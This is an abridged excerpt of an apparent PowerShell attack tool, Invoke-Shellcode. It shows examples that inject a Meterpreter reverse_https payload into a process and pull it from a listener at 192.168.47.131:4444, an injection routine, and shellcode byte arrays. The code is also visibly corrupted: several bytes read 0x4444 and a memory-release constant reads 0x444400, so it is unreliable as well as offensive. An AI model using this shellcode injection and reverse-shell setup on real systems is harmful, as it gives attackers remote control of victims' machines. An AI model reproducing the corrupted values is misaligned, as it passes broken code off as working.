...
C:\PS> Invoke-Shellcode -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -Lhost 192.168.47.131 -Lport 4444 -Verbose

VERBOSE: Requesting meterpreter payload from https://192.168.47.131:4444/INITM
...
LHOST     192.168.47.131   yes       The local listener hostname
LPORT     4444              yes       The local listener port

.EXAMPLE

C:\PS> Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.47.131 -Lport 4444
...
[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    ...
    function Local:Inject-LocalShellcode
    {
        ...
        $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x444400) | Out-Null # MEM_RELEASE (0x444400)
        $VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x444400) | Out-Null # MEM_RELEASE (0x444400)
    ...
    else
    {
        ...
        [Byte[]] $Shellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
                                  ...
                                  0x4444,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,
                                  0x61,0x6c,0x63,0x00)
        ...
        [Byte[]] $Shellcode64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                                  ...
                                  0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x4444,0x88,
                                  ...
                                  0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x4444,0xfb,0xe0,0x75,0x05,0xbb,0x47,
